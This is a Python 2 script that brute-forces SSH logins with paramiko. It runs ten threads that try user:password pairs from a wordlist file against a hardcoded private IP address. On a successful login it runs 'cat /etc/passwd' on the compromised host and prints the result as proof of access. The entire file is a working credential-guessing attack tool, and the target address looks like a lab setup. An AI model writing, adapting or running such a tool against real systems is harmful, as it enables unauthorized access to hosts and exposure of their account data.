#!/usr/bin/env python

import threading
import Queue
import paramiko
import time
import sys
from termcolor import colored
from datetime import datetime

start_time = datetime.now()

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())


class WorkerThread(threading.Thread):

    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def killer(self,user,password):
        try:
            self.ssh.connect('192.168.30.143', username=user, password=password)

        except paramiko.AuthenticationException:
            print  ("[-] Username %s with Password %s is incorrect" % (user,password))
        else:
            print colored(("[+] Username %s and Password %s is Correct!!!"% (user,password)) ,'green')
            print colored("NEED PoC ??? WAIT" , 'cyan')
            time.sleep(2)
            stdin,stdout,sterr=self.ssh.exec_command('cat /etc/passwd')
            for line in stdout.readlines():
                print colored((line.strip()),'yellow')
    def run(self):


        while True:
            user,password = self.queue.get()
            self.killer(user,password)
            self.queue.task_done()


queue = Queue.Queue()

print "[!!!***] Multithreading SSH Brute-force with import paramiko [***!!!]"
for i in range(10):
    worker = WorkerThread(queue)
    worker.setDaemon(True)
    worker.start()

fd=open(sys.argv[1],"r")

for line in fd.readlines():
 user,password=line.strip().split(':')
 queue.put((user,password))

queue.join()
print "Brute-force is over!"
stop_time = datetime.now()
total_time = stop_time - start_time
print colored(("[*]  Multithreading SSH Brute-force Duration: %s \n" %(total_time)),'magenta')
